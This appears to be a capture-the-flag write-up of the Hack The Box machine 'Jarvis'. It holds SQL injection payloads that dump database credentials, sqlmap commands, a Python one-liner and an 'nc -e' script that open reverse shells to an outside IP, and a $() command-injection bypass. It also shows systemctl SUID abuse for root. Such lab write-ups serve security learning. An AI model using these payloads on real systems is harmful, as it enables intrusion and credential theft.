---
title: HTB-Jarvis
draft: false
tags:
  - htb
  - linux
  - sqli
  - sqlmap
  - cme
  - systemctl
  - medium
---
![](https://i.imgur.com/CmJK7cH.png)


## Information Gathering
### Rustscan

Rustscan found **SSH**, **HTTP**, and port **64999** open.

```bash
┌──(yoon㉿kali)-[~/Documents/htb/jarvis]
└─$ rustscan --addresses 10.10.10.143 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
<snip>
Host is up, received syn-ack (0.71s latency).
Scanned at 2024-04-01 09:04:45 EDT for 2s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
64999/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
```

### Nmap

Port 6499 seemed to be HTTP server

```bash
┌──(yoon㉿kali)-[~/Documents/htb/jarvis]
└─$ sudo nmap -sVC -p 22,80,64999 10.10.10.143 -v
<snip>

Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.38s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
|_http-server-header: Apache/2.4.25 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<snip>
Nmap done: 1 IP address (1 host up) scanned in 53.07 seconds
           Raw packets sent: 7 (284B) | Rcvd: 63 (12.440KB)
```

## Enumeration

### HTTP - TCP 64999

Web Server running on port 64999 seemed to be protected from Bruteforcing attack:

![](https://i.imgur.com/GdaJvs4.png)


I attempted on both Direcotry Bruteforcing and Subdomain Enumeration but neither worked out.


### HTTP - TCP 80

On top left side of the webpage, I noticed the domain name **supersecurehotel.htb** and added it to /etc/hosts.

![](https://i.imgur.com/hFOLso7.png)




#### Directory Bruteforce

I tried directory bruteforcing with Feroxbuster and it found nothing useful other than **/phpmyadmin**:

`sudo feroxbuster -u http://10.10.10.143 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![](https://i.imgur.com/GSzcUVg.png)



#### /phpmyadmin
**/phpmyadmin** seemed quite normal but I wasn't able to figure out it's version information. I tried log-in with several default credentials but it wasn't successful:


![](https://i.imgur.com/eaX1cTk.png)





## SQLi
### Entry Point Detection

When user tries to reserve a room, url is moved to somewhere like `/room.php?cod=<number>`:

![](https://i.imgur.com/u8HJy5V.png)


I confirmed potential SQLi vulnerability by attaching `'` sign at the end of the url and page showed an error:

![](https://i.imgur.com/cySTpMO.png)


### Detecting number of columns

In order to detect number of columns on SQL table, I used `ORDER BY`.

When **cod** parameter is queried with `1 ORDER BY 7`, it doesn't show any error:

![](https://i.imgur.com/C8AgIpl.png)


However, when **cod** parameter is queried with `1 ORDER BY 8`, webapp throw back an error, indicating there's 7 columns on table:

![](https://i.imgur.com/DeHNILg.png)


### Query Info


I made injection with `?cod=-1 UNION SELECT 1,2,3,4,5,6,7` and the web app showed me where each column is located at. 

![](https://i.imgur.com/Px21lw0.png)


Column 5: Picture
Column 2: Room Title
Column 3: Price
Column 4: Description

This meant that I can use the above four columns to query information from the table and see the output on the webapp page. If I query with columns, 1,6, 7, I won't be able to see output on web app.

#### database(), user()

`?cod=-1 UNION select 1,database(),user(),4,5,6,7`

![](https://i.imgur.com/QVfBPYe.png)


##### List DBs	

`?cod=-1 UNION SELECT 1, group_concat(schema_name),3,4,5,6,7 from information_schema.schemata`

![](https://i.imgur.com/SZbRIM9.png)


#### Show Tables in hotel	

`?cod=-1 UNION SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema=%27hotel%27 ;-- -`

![](https://i.imgur.com/5E4Jc6S.png)


##### Show Columns in room	

`?cod=-1 UNION SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -`


![](https://i.imgur.com/lVuARoq.png)


#### Show Tables in mysql	

`?cod=-1 UNION SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -`

![](https://i.imgur.com/Bf8YpGI.png)



#### Show Columns in user	


#### Get Username / Password

`$cod=-1 UNION SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -`

![](https://i.imgur.com/oICljK1.png)



## Shell as www-data
### sqlmap

Automating this process was possible through **sqlmap**:

`sqlmap -r req.txt --dbs --batch`

![](https://i.imgur.com/4pbmhFw.png)


Even obtaining shell through **sqlmap** was possible:

`sqlmap -r req.txt --dbs --batch --os-shell`

![](https://i.imgur.com/7WegXZt.png)


However, this shell was very limited so decided to spawn a proper shell.


By using the following code on sqlmap os shell, I was able to spawn a reverse shell:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.12",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now I have shell connection as **www-data** on my netcat listener:

![](https://i.imgur.com/aoagOG1.png)


## Privesc: www-data to pepper


I first made the shell more interactive using: `python -c 'import pty; pty.spawn("/bin/bash")'`


### Linpeas

I ran linpeas.sh and it found several interesting potential escalation points.

First of all, SQL was running locally on server so I'd be able to take a look into it with proper credentials:

![](https://i.imgur.com/C39dspF.png)

www-data can run **simpler.py** as the user jarvis:

![](https://i.imgur.com/37QHroR.png)

**SYSTEMCTL** SUID file seemed to be vulnerable to privilege escalation:

![](https://i.imgur.com/UR7jw3s.png)

### simpler.py

I moved on to check on **simpler.py** and it had a function of sending `ping` to entered IP address:

![](https://i.imgur.com/f3bEMf5.png)

I tried limiting the ping to 3 and it threw back on error message at me.

![](https://i.imgur.com/uOFbybR.png)


I took a look at the code and it turned out there were forbidden characters:

```python
forbidden = ['&', ';', '-', '`', '||', '|']
```

It seemed that if the entered command passes the blacklist, it is forwarded to `os.system()`

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

Luckily, **$** character is not blacklisted so I was able to spawn a shell abusing this point. 
### Reverse Shell

I created reverse shell script on **/tmp** as such:

`echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.16.12 443'`

![](https://i.imgur.com/vifjEj2.png)

I gave it execution using `chmod +x rev.sh` and entered path to reverse shell when prompted with entering IP:

`$(/tmp/rev/sh)`

![](https://i.imgur.com/dAP0dUr.png)

Now on my local listener, reverse shell was spawned as **pepper**:

![](https://i.imgur.com/PcHu5kz.png)


## Privesc: pepper to root

Following [my cheatsheet](https://jadu101.github.io/Persistence%F0%9F%A5%B7%F0%9F%8F%BB/Linux-Persistence#ssh-as-root), I first created ssh connection as **pepper** to make my connection more stable:

![](https://i.imgur.com/jJtlFP5.png)


Going back to **linpeas** result, I remember about **systemctl**:


![](https://i.imgur.com/UR7jw3s.png)


[GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)got a great tutorial on how to abuse this. 
### Malicious Service
A service is defined by a `.service` extension and **systemctl** is what links the service to **systemd** and it is used again to start the service. 

I created **vulnerable.service** following GTFOBins as such:

![](https://i.imgur.com/fxQS41U.png)

Now I created **shell.sh** that will spawn a reverse shell back to me:

![](https://i.imgur.com/GnDhXQX.png)

Linking vulnerable.service using systemctl, now I am ready the service:

`systemctl link /home/pepper/vulnerable.service`

![](https://i.imgur.com/TCNiEOi.png)

Now by running the service with `systemctl run vulnerable.service`, I get a root reverse shell connection:

![](https://i.imgur.com/adpSDjC.png)

## References
- https://gtfobins.github.io/#system
- https://jadu101.github.io/Persistence%F0%9F%A5%B7%F0%9F%8F%BB/Linux-Persistence#ssh-as-root
- https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/